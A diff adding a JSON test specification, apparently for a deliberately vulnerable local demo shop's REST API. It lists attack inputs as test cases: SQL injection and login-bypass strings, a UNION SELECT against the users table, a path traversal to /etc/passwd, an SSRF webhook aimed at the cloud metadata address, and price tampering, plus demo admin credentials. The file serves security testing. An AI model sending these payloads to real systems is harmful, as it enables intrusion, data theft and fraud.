@@ -1,0 +1,122 @@
+{
+  "name": "api-testing",
+  "description": "REST API testing methodology for ACME Demo endpoints",
+  "version": "1.0.0",
+  "type": "skill",
+  "base_url": "http://localhost:3001/api",
+  "endpoints": {
+    "auth": {
+      "POST /auth/register": {
+        "tests": [
+          {
+            "name": "normal_registration",
+            "body": { "username": "testuser", "password": "test123", "email": "test@example.com" },
+            "expected_status": 201
+          },
+          {
+            "name": "sqli_in_username",
+            "body": { "username": "admin'; DROP TABLE users; --", "password": "test123", "email": "x@x.com" },
+            "expected_status": 500,
+            "vulnerability": "SQL Injection"
+          },
+          {
+            "name": "sqli_in_email",
+            "body": { "username": "hacker", "password": "test123", "email": "x@x.com' OR '1'='1" },
+            "expected_status": 500,
+            "vulnerability": "SQL Injection"
+          }
+        ]
+      },
+      "POST /auth/login": {
+        "tests": [
+          {
+            "name": "valid_login",
+            "body": { "username": "admin", "password": "admin123" },
+            "expected_status": 200,
+            "check_response_for": ["token", "password", "api_key"]
+          },
+          {
+            "name": "sqli_bypass",
+            "body": { "username": "' OR '1'='1' --", "password": "anything" },
+            "expected_status": 200,
+            "vulnerability": "SQL Injection - Auth Bypass"
+          }
+        ]
+      },
+      "GET /auth/users": {
+        "tests": [
+          {
+            "name": "unauthenticated_access",
+            "headers": {},
+            "expected_status": 200,
+            "vulnerability": "Broken Access Control"
+          }
+        ]
+      }
+    },
+    "products": {
+      "GET /products": {
+        "tests": [
+          {
+            "name": "list_all_products",
+            "expected_status": 200
+          }
+        ]
+      },
+      "GET /products/search": {
+        "tests": [
+          {
+            "name": "normal_search",
+            "query": { "q": "laptop" },
+            "expected_status": 200
+          },
+          {
+            "name": "sqli_in_search",
+            "query": { "q": "' UNION SELECT * FROM users --" },
+            "expected_status": 200,
+            "vulnerability": "SQL Injection"
+          }
+        ]
+      },
+      "GET /products/images/:filename": {
+        "tests": [
+          {
+            "name": "path_traversal",
+            "params": { "filename": "../../etc/passwd" },
+            "expected_status": 404,
+            "check_response_for": ["path"],
+            "vulnerability": "Path Traversal + Info Leak"
+          }
+        ]
+      }
+    },
+    "checkout": {
+      "POST /checkout/create": {
+        "tests": [
+          {
+            "name": "ssrf_via_webhook",
+            "body": {
+              "userId": 1,
+              "items": [{ "productId": 1, "quantity": 1, "price": 0.01 }],
+              "totalPrice": 0.01,
+              "webhookUrl": "http://169.254.169.254/latest/meta-data/"
+            },
+            "expected_status": 201,
+            "vulnerability": "SSRF"
+          },
+          {
+            "name": "price_manipulation",
+            "body": {
+              "userId": 1,
+              "items": [{ "productId": 1, "quantity": 1, "price": 0.01 }],
+              "totalPrice": 0.01,
+              "webhookUrl": null
+            },
+            "expected_status": 201,
+            "vulnerability": "Client-Side Price Trust"
+          }
+        ]
+      }
+    }
+  }
+}
